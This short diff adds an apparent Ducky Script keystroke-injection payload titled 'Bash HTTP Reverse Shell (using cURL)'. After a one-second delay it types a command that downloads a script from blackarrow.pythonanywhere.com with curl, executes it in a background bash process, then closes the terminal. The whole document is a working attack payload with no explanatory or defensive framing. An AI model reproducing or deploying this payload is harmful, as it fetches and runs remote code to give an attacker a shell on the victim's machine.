@@ -1,0 +1,4 @@
+REM Bash HTTP Reverse Shell (using cURL)
+DELAY 1000
+STRING (bash -c "$(curl blackarrow.pythonanywhere.com/bash/)"&);exit
+ENTER
